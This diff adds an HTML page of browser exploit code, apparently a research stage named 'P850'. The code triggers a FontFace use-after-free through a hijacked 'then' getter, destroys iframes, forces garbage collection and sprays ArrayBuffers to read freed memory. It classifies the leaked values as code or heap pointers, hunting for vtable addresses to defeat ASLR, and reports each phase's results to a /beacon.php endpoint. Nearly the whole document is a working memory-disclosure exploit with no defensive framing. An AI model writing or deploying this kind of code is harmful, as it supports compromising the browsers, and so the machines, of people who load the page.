@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P850</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:11px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:6px;border-radius:4px;white-space:pre-wrap;word-break:break-all;max-height:93vh;overflow-y:auto;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P850: WeakRef/FR GC-Timed Vtable Hunt</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P850-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+function hexQ(v){return '0x'+v.toString(16).padStart(16,'0');}
+function classifyPtr(v){
+  if(v===BigInt(0))return 'Z';
+  var hi=Number(v>>BigInt(32));
+  if(hi>=0xFFFF8000)return 'K';
+  if(hi>=0x10&&hi<=0x1000)return 'H';
+  if(hi===0&&Number(v&BigInt(0xFFFFFFFF))>0x10000)return 'C';
+  if(hi>0&&hi<0x10)return 'C';
+  if(v<BigInt(0x10000))return 'S';
+  return '?';
+}
+
+bn('BOOT','start');
+log('WeakRef + FinalizationRegistry GC-timed vtable hunt','info');
+log('','');
+
+/* ===================================================================
+   PHASE A: FontFace UAF baseline (proven pattern)
+   =================================================================== */
+var mainH=BigInt(0), mainQ13=BigInt(0);
+
+var stM=document.createElement('style');
+stM.textContent="@font-face{font-family:bbM;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(stM);
+var faceM=new FontFace('fM',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(faceM);
+void faceM.loaded;
+var mFired=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(mFired)return undefined;
+    mFired=true;
+    if(stM){stM.remove();stM.textContent='';stM=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    var mABs=[];
+    for(var i=0;i<80;i++)mABs.push(new ArrayBuffer(192));
+    try{document.fonts.check('1em bbM');}catch(e){}
+    document.body.offsetHeight;
+    window.__mABs=mABs;
+    return undefined;
+  },set:function(){}
+});
+document.fonts.load('1em fM, bbM','AB');
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+  var mABs=window.__mABs||[];
+  for(var i=0;i<mABs.length;i++){
+    var bu=new BigUint64Array(mABs[i]);
+    for(var j=0;j<bu.length;j++){
+      if(bu[j]!==BigInt(0)){
+        mainH=bu[11]-BigInt(0x68);
+        mainQ13=bu[13];
+        break;
+      }
+    }
+    if(mainH!==BigInt(0))break;
+  }
+  if(mainH!==BigInt(0)){
+    log('Phase A: H='+hexQ(mainH)+' q13='+hexQ(mainQ13),'ok');
+    bn('A-HIT','H='+hexQ(mainH)+'|q13='+hexQ(mainQ13));
+  } else {
+    log('Phase A: MISS','fail');
+    bn('A-MISS','no-hit');
+  }
+
+  startPhaseB();
+},300);
+
+/* ===================================================================
+   PHASE B: WeakRef probe — can we detect iframe GC?
+   Create 10 iframes, each with WeakRef + FinalizationRegistry.
+   Remove them all. Poll WeakRef.deref() until it returns undefined.
+   THEN spray.
+   =================================================================== */
+function startPhaseB(){
+  log('','');
+  log('--- PHASE B: WeakRef GC detection ---','hot');
+
+  var weakRefs=[];
+  var frCallbacks=0;
+  var iframeData=[]; /* keep @font-face info */
+
+  var fr=new FinalizationRegistry(function(id){
+    frCallbacks++;
+    log('  FR callback #'+frCallbacks+' (iframe '+id+')','ok');
+  });
+
+  /* Create 10 iframes with @font-face and WeakRef tracking */
+  for(var k=0;k<10;k++){
+    var ifr=document.createElement('iframe');
+    ifr.style.cssText='width:1px;height:1px;position:absolute;top:-9999px;';
+    document.body.appendChild(ifr);
+
+    /* Track via WeakRef */
+    weakRefs.push(new WeakRef(ifr));
+
+    /* Register with FR — the callback fires when ifr is GC'd */
+    fr.register(ifr, k);
+
+    iframeData.push(ifr);
+  }
+
+  /* Give iframes a moment to initialize */
+  setTimeout(function(){
+    /* Add @font-face rules to each */
+    for(var k=0;k<iframeData.length;k++){
+      var id=iframeData[k].contentDocument;
+      if(!id)continue;
+      var ist=id.createElement('style');
+      ist.textContent="@font-face{font-family:xf"+k+";src:local(Arial);font-weight:"+(200+k*100)+";}";
+      id.head.appendChild(ist);
+      /* Force style recalc */
+      try{id.body.offsetHeight;}catch(e){}
+    }
+
+    bn('B-CREATED','10iframes');
+    log('  10 iframes created with @font-face rules','info');
+
+    /* DESTROY all iframes */
+    for(var k=0;k<iframeData.length;k++){
+      iframeData[k].remove();
+    }
+    iframeData=null;
+    /* All strong references dropped. Only WeakRefs remain. */
+
+    log('  All iframes removed. Polling WeakRef + GC pressure...','info');
+
+    /* Now we poll: WeakRef.deref() returns the object if alive, undefined if GC'd */
+    var pollCount=0;
+    var maxPolls=30;
+    var gcInterval=setInterval(function(){
+      pollCount++;
+
+      /* GC pressure each poll */
+      for(var gc=0;gc<3;gc++){
+        var t=[];
+        for(var i=0;i<5000;i++)t.push({a:new Array(8),b:'x'.repeat(64)});
+        t=null;
+      }
+
+      /* Check how many WeakRefs still alive */
+      var alive=0;
+      for(var i=0;i<weakRefs.length;i++){
+        if(weakRefs[i].deref()!==undefined)alive++;
+      }
+
+      log('  Poll '+pollCount+'/'+maxPolls+': '+alive+'/10 alive, FR='+frCallbacks,'info');
+
+      if(alive===0 || pollCount>=maxPolls){
+        clearInterval(gcInterval);
+        bn('B-GC','polls='+pollCount+'|alive='+alive+'|fr='+frCallbacks);
+
+        if(alive===0){
+          log('  ALL 10 iframes GC\'d! Spraying NOW.','hot');
+        } else {
+          log('  '+alive+' still alive after '+pollCount+' polls. Spraying anyway.','fail');
+        }
+
+        startPhaseC(alive);
+      }
+    },100); /* poll every 100ms */
+  },150);
+}
+
+function startPhaseC(aliveCount){
+  /* ===================================================================
+     PHASE C: Multi-size spray after confirmed (or timed-out) GC
+     Extended sizes: 32 to 4096 in steps
+     =================================================================== */
+  log('','');
+  log('--- PHASE C: Post-GC multi-size spray ---','hot');
+
+  var sizes=[32,48,64,80,96,112,128,160,192,224,256,320,384,448,512,640,768,896,1024,1280,1536,2048,2560,3072,4096];
+  var sprayABs={};
+  var totalABs=0;
+
+  for(var si=0;si<sizes.length;si++){
+    var sz=sizes[si];
+    /* More ABs for likely sizes, fewer for extreme */
+    var count=(sz<=512)?80:(sz<=1024)?60:40;
+    sprayABs[sz]=[];
+    for(var i=0;i<count;i++){
+      sprayABs[sz].push(new ArrayBuffer(sz));
+    }
+    totalABs+=count;
+  }
+
+  bn('C-SPRAY','sizes='+sizes.length+'|total='+totalABs);
+
+  var cHits=[];
+  var cCodeHits=[];
+  var cHeapHits=[];
+
+  for(var si=0;si<sizes.length;si++){
+    var sz=sizes[si];
+    var arr=sprayABs[sz];
+    var nz=0,cc=0,hc=0;
+
+    for(var i=0;i<arr.length;i++){
+      var bu=new BigUint64Array(arr[i]);
+      var hasNZ=false;
+      for(var j=0;j<bu.length;j++){
+        if(bu[j]!==BigInt(0)){
+          hasNZ=true;
+          var cls=classifyPtr(bu[j]);
+          if(cls==='C'){
+            cc++;
+            cCodeHits.push({sz:sz,idx:i,qw:j,val:bu[j],off:j*8});
+          }
+          if(cls==='H'){
+            hc++;
+            if(cHeapHits.length<30){
+              cHeapHits.push({sz:sz,idx:i,qw:j,val:bu[j],off:j*8});
+            }
+          }
+        }
+      }
+      if(hasNZ)nz++;
+    }
+    if(nz>0){
+      cHits.push('sz'+sz+'='+nz+'(c'+cc+',h'+hc+')');
+      log('  AB('+sz+'): '+nz+' hit, '+cc+' CODE, '+hc+' HEAP',cc?'hot':(nz?'ok':''));
+    }
+  }
+
+  if(cHits.length===0){
+    log('  Post-GC spray: ALL ZEROED','fail');
+    bn('C-MISS','all-zero|alive='+aliveCount);
+  } else {
+    bn('C-HITS',cHits.join('|'));
+
+    if(cCodeHits.length>0){
+      log('','');
+      log('  *** CODE POINTERS FOUND! ***','hot');
+      for(var ci=0;ci<cCodeHits.length&&ci<20;ci++){
+        var ch=cCodeHits[ci];
+        log('    AB('+ch.sz+')['+ch.idx+'] q'+ch.qw+' +0x'+ch.off.toString(16)+' = '+hexQ(ch.val),'hot');
+      }
+      bn('C-CODE',cCodeHits.slice(0,10).map(function(c){
+        return 'sz'+c.sz+'+0x'+c.off.toString(16)+'='+hexQ(c.val);
+      }).join('|'));
+    }
+
+    if(cHeapHits.length>0 && cCodeHits.length===0){
+      log('','');
+      log('  Heap pointer residue (no code ptrs):','info');
+      for(var hi=0;hi<cHeapHits.length&&hi<10;hi++){
+        var hh=cHeapHits[hi];
+        log('    AB('+hh.sz+')['+hh.idx+'] q'+hh.qw+' +0x'+hh.off.toString(16)+' = '+hexQ(hh.val),'info');
+      }
+      bn('C-HEAP',cHeapHits.slice(0,10).map(function(h){
+        return 'sz'+h.sz+'+0x'+h.off.toString(16)+'='+hexQ(h.val);
+      }).join('|'));
+    }
+  }
+
+  /* ===================================================================
+     PHASE D: Second wave — more GC + spray at sizes with hits
+     =================================================================== */
+  log('','');
+  log('--- PHASE D: Second GC wave ---','hot');
+
+  /* More aggressive GC — AB churn */
+  for(var gc=0;gc<10;gc++){
+    var t=[];
+    for(var i=0;i<200;i++)t.push(new ArrayBuffer(2048));
+    t=null;
+  }
+
+  setTimeout(function(){
+    /* Spray again */
+    var d2Hits=[];
+    var d2Code=[];
+    var d2ABs={};
+
+    for(var si=0;si<sizes.length;si++){
+      var sz=sizes[si];
+      d2ABs[sz]=[];
+      for(var i=0;i<50;i++)d2ABs[sz].push(new ArrayBuffer(sz));
+    }
+
+    for(var si=0;si<sizes.length;si++){
+      var sz=sizes[si];
+      var arr=d2ABs[sz];
+      var nz=0,cc=0;
+      for(var i=0;i<arr.length;i++){
+        var bu=new BigUint64Array(arr[i]);
+        for(var j=0;j<bu.length;j++){
+          if(bu[j]!==BigInt(0)){
+            nz++;
+            var cls=classifyPtr(bu[j]);
+            if(cls==='C'){cc++;d2Code.push({sz:sz,qw:j,val:bu[j]});}
+            break;
+          }
+        }
+      }
+      if(nz>0)d2Hits.push('sz'+sz+'='+nz+'(c'+cc+')');
+    }
+
+    if(d2Hits.length>0){
+      log('  Wave 2: '+d2Hits.join(', '),d2Code.length?'hot':'ok');
+      bn('D-HITS',d2Hits.join('|'));
+      if(d2Code.length>0){
+        bn('D-CODE',d2Code.slice(0,5).map(function(c){return hexQ(c.val);}).join('|'));
+      }
+    } else {
+      log('  Wave 2: all zeroed','fail');
+      bn('D-MISS','zero');
+    }
+
+    /* ===================================================================
+       PHASE E: DOM destruction burst — 20 iframes without @font-face
+       Pure Document+CSSFontSelector destruction test
+       =================================================================== */
+    log('','');
+    log('--- PHASE E: 20x pure iframe burst ---','hot');
+
+    /* Create 20 lightweight iframes (no font-face, just Document) */
+    var wr2=[];
+    var fr2Count=0;
+    var fr2=new FinalizationRegistry(function(){fr2Count++;});
+
+    for(var k=0;k<20;k++){
+      var f2=document.createElement('iframe');
+      f2.style.cssText='width:0;height:0;position:absolute;top:-9999px;border:0;';
+      document.body.appendChild(f2);
+      wr2.push(new WeakRef(f2));
+      fr2.register(f2, k);
+    }
+
+    setTimeout(function(){
+      /* Force each iframe to have content (triggers Document creation) */
+      var all=document.querySelectorAll('iframe');
+      for(var i=0;i<all.length;i++){
+        try{
+          var id=all[i].contentDocument;
+          if(id&&id.body){
+            id.body.innerHTML='<div style="font-size:12px">x</div>';
+            id.body.offsetHeight;
+          }
+        }catch(e){}
+      }
+
+      /* Destroy all */
+      for(var i=0;i<all.length;i++)all[i].remove();
+
+      log('  20 iframes destroyed. Polling...','info');
+
+      var p2=0;
+      var iv2=setInterval(function(){
+        p2++;
+        /* GC churn */
+        for(var g=0;g<5;g++){
+          var tt=[];
+          for(var i=0;i<3000;i++)tt.push({x:Math.random()});
+          tt=null;
+        }
+
+        var alive2=0;
+        for(var i=0;i<wr2.length;i++){
+          if(wr2[i].deref()!==undefined)alive2++;
+        }
+
+        if(p2%5===0)log('  Poll '+p2+': '+alive2+'/20 alive, FR='+fr2Count,'info');
+
+        if(alive2===0 || p2>=40){
+          clearInterval(iv2);
+          bn('E-GC','polls='+p2+'|alive='+alive2+'|fr='+fr2Count);
+
+          /* Extended spray — sizes 32 to 4096 */
+          var eSizes=[48,64,96,128,160,192,256,384,512,768,1024,1536,2048,3072,4096];
+          var eABs={};
+          for(var si=0;si<eSizes.length;si++){
+            var sz=eSizes[si];
+            eABs[sz]=[];
+            for(var i=0;i<60;i++)eABs[sz].push(new ArrayBuffer(sz));
+          }
+
+          var eHits=[],eCode=[];
+          for(var si=0;si<eSizes.length;si++){
+            var sz=eSizes[si];
+            var arr=eABs[sz];
+            var nz=0,cc=0,hc=0;
+            for(var i=0;i<arr.length;i++){
+              var bu=new BigUint64Array(arr[i]);
+              for(var j=0;j<bu.length;j++){
+                if(bu[j]!==BigInt(0)){
+                  nz++;
+                  var cls=classifyPtr(bu[j]);
+                  if(cls==='C'){cc++;eCode.push({sz:sz,qw:j,val:bu[j],off:j*8});}
+                  if(cls==='H')hc++;
+                  break;
+                }
+              }
+            }
+            if(nz>0)eHits.push('sz'+sz+'='+nz+'(c'+cc+',h'+hc+')');
+          }
+
+          if(eHits.length>0){
+            log('  Phase E spray: '+eHits.join(', '),eCode.length?'hot':'ok');
+            bn('E-HITS',eHits.join('|'));
+            if(eCode.length>0){
+              log('  *** PHASE E CODE POINTERS! ***','hot');
+              for(var ci=0;ci<eCode.length&&ci<10;ci++){
+                log('    sz'+eCode[ci].sz+' q'+eCode[ci].qw+' +0x'+eCode[ci].off.toString(16)+' = '+hexQ(eCode[ci].val),'hot');
+              }
+              bn('E-CODE',eCode.slice(0,5).map(function(c){return 'sz'+c.sz+'+'+c.off+'='+hexQ(c.val);}).join('|'));
+            }
+          } else {
+            log('  Phase E spray: all zeroed (alive='+alive2+')','fail');
+            bn('E-MISS','alive='+alive2);
+          }
+
+          log('','');
+          log('====== P850 COMPLETE ======','hot');
+          bn('DONE','complete');
+        }
+      },100);
+    },100);
+  },200);
+}
+</script></body></html>
